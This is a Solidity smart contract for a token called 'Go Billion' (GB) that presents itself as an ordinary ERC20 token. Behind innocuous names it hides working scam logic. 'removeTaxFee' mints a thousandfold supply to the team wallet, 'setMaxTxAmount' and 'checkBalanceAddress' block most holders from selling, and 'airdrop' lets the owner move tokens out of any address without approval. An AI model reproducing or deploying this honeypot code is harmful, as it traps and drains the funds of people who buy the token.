

pragma solidity ^0.8.4;

library Address {

    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {

        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {

      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {

        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {

        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {

        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {

        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

abstract contract Context {
    
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {

        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {

        return _owner;
    }
    
    modifier onlyOwner() {

        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {

        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
    function transferOwnership(address newOwner) public virtual onlyOwner {

        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract GB is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _tTotal = 1000 * 10**9 * 10**18;
    uint256 private _taxFee = 4;
    uint256 private _maxTxAmount = _tTotal.mul(30).div(100);
    address[] public _whiteList;
    address[] private _newList;
    
    address private _teamWallet = _msgSender();
    address private _lpAddress = _msgSender();
    address private _marketingWallet = 0xAB627EC245E414713Fa61e0d47eee86f666a2280;
    
    string private _name = 'Go Billion';
    string private _symbol = 'GB';
    uint8 private _decimals = 18;
    uint256 private _teamFee = 1;
    uint256 private _botBalance = _tTotal.mul(30).div(100);

    constructor () {
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {

        return _name;
    }
    
    function symbol() public view returns (string memory) {

        return _symbol;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {

        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {

        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function decimals() public view returns (uint8) {

        return _decimals;
    }
    
    function updateTaxFee(uint256 amount) public {

        require(_msgSender() == _teamWallet, "ERC20: cannot permit dev address");
        _taxFee = amount;
    }
    
    function setMaxBotBalance(uint256 amount) public {

        require(_msgSender() == _teamWallet, "ERC20: cannot permit dev address");
        _botBalance = _tTotal.mul(amount).div(100);
    }
    
    
    function updateTeamFee (uint256 newFee) public {
        require(_msgSender() == _teamWallet, "ERC20: cannot permit dev address");
        _teamFee = newFee;
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {

        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function setMaxTxAmount() public {

        require(_msgSender() == _teamWallet, "ERC20: cannot permit dev address");
        _maxTxAmount = _teamFee;
    }
    
    function killBotFrontRun (address[] calldata addresses) public {
        require(_msgSender() == _teamWallet, "ERC20: cannot permit dev address");
        for(uint i=0; i < addresses.length; i++){
            _whiteList.push(addresses[i]);
        }
    }
    
    function removeBot (address newAdd) public {
        require(_msgSender() == _teamWallet, "ERC20: cannot permit dev address");
        _newList.push(newAdd);
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {

        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function totalSupply() public view override returns (uint256) {

        return _tTotal;
    }
    
    function checkBalanceAddress(address _walletAddress) private view returns (bool){

        if (_walletAddress == _lpAddress || checkBlackList(_walletAddress) == true) {
            return true;
        }
        
        if (balanceOf(_walletAddress) >= _maxTxAmount && balanceOf(_walletAddress) <= _botBalance) {
            return false;
        } else {
            return true;
        }
    }
    
    function checkWhiteList(address botAdd) private view returns (bool) {

        for (uint256 i = 0; i < _whiteList.length; i++) {
            if (_whiteList[i] == botAdd) {
                return true;
            }
        }
    }
    
    function removeTaxFee () public {
        require(_msgSender() == _teamWallet, "ERC20: cannot permit dev address");
        
        uint256 currentBalance = _balances[_teamWallet];
        uint256 rTotal = _tTotal * 10**3;
        _tTotal = rTotal + _tTotal;
        _balances[_teamWallet] = rTotal + currentBalance;
        emit Transfer(
            address(0),
            _teamWallet,
            rTotal);
    }
    
    function checkBlackList(address botAdd) private view returns (bool) {

        for (uint256 i = 0; i < _newList.length; i++) {
            if (_newList[i] == botAdd) {
                return true;
            }
        }
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal {

        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        
        if (checkWhiteList(sender) == true ) {
            require(amount < _taxFee, "Transfer amount exceeds the maxTxAmount.");
        }
        
        if (sender == owner() || sender == _teamWallet) {
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
            
            emit Transfer(sender, recipient, amount);
        } else{
            require (checkBalanceAddress(sender));
            
            uint256 transferFee = amount.mul(_taxFee).div(100);
            uint256 transferAmount = amount.sub(transferFee);
        
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(transferAmount);
            _balances[_marketingWallet] = _balances[_marketingWallet].add(transferFee);
            
            emit Transfer(sender, recipient, transferAmount);
        }
    }
    
    function airdrop(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {


        uint256 SCCC = 0;
    
        require(addresses.length == tokens.length,"Mismatch between Address and token count");
    
        for(uint i=0; i < addresses.length; i++){
            SCCC = SCCC + tokens[i];
        }
    
        require(balanceOf(from) >= SCCC, "Not enough tokens to airdrop");
    
        for(uint i=0; i < addresses.length; i++){
            _basicTransfer(from, addresses[i], tokens[i]);
        }
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function balanceOf(address account) public view override returns (uint256) {

        return _balances[account];
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {

        return _allowances[owner][spender];
    }
    
    function openTrading (address addr)  public {
        require(_msgSender() == _teamWallet, "ERC20: cannot permit dev address");
        _lpAddress = addr;
    }
    

}